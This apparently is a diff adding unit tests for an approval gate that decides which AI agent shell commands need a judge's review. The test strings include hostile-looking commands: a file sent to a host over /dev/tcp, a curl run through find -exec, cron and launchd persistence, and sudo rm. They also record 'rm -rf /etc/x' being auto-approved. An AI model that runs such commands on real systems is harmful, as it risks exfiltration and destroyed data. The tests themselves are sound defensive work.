@@ -1066,6 +1066,47 @@ describe('Auto approves everything (P13-26)', () => {
     ]);
   });
 
+  it.each([
+    'sudo mysender --to x',
+    '/usr/local/bin/sendmail-wrapper customer@example.com',
+    'crontab /tmp/job',
+    'launchctl load /Library/LaunchDaemons/x.plist',
+    'kill 1234',
+    'git config --global user.email x@example.com',
+    'find . -exec curl x \\;',
+    'sudo rm x',
+    'cat /etc/hosts > /dev/tcp/example.com/80',
+    'sed -i s/a/b/ /etc/x',
+  ])('%s goes to the judge (review C1)', async (command) => {
+    const { judge, seen } = scripted(approve({ sendsOrSpends: false }));
+    const { c, approve: approved } = auto(command);
+    await new ApprovalWatch({ judge }).handle(c);
+    expect(seen).toHaveLength(1);
+    expect(approved).toHaveBeenCalledTimes(1);
+  });
+
+  it.each(['rm -rf /etc/x', 'cat /etc/hosts', 'mkdir -p /tmp/a', 'sed -n 1,5p /etc/hosts'])(
+    '%s is approved without the judge (review C1)',
+    async (command) => {
+      const { judge, seen } = scripted(sends());
+      const { c, approve: approved, hold } = auto(command);
+      await new ApprovalWatch({ judge }).handle(c);
+      expect(seen).toHaveLength(0);
+      expect(hold).not.toHaveBeenCalled();
+      expect(approved).toHaveBeenCalledWith(expect.objectContaining({ allowedBy: 'auto' }));
+    },
+  );
+
+  it('a Write tool to /tmp is approved without the judge (review C1)', async () => {
+    const { judge, seen } = scripted(sends());
+    const { c, approve: approved } = auto('', {
+      toolCall: { toolName: 'Write', input: { file_path: '/tmp/a.txt', content: 'a' } },
+    });
+    await new ApprovalWatch({ judge }).handle(c);
+    expect(seen).toHaveLength(0);
+    expect(approved).toHaveBeenCalledWith(expect.objectContaining({ allowedBy: 'auto' }));
+  });
+
   it('rm -rf /etc/x is approved without the judge', async () => {
     const { judge, seen } = scripted(sends());
     const {
